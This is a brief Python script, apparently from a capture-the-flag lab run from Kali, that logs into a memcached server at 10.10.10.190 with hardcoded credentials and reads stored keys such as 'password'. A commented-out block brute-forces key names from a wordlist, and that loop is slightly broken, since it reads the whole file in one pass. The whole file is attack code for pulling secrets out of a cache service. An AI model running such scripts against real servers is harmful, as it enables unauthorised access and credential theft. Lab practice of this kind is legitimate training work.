import bmemcached
client = bmemcached.Client(('10.10.10.190:11211', ), 'felamos',
                                    'zxcvbnm')
print(client.get("password") )
print(client.get("351aecd1a2ba1d8ccdf889bae6223c0a") )
'''
with open("/home/kali/wordlists/raft-large-words.txt","r") as w:
    while(r:=w.read()):
        t = r.strip()
        print(client.get(t) )
'''
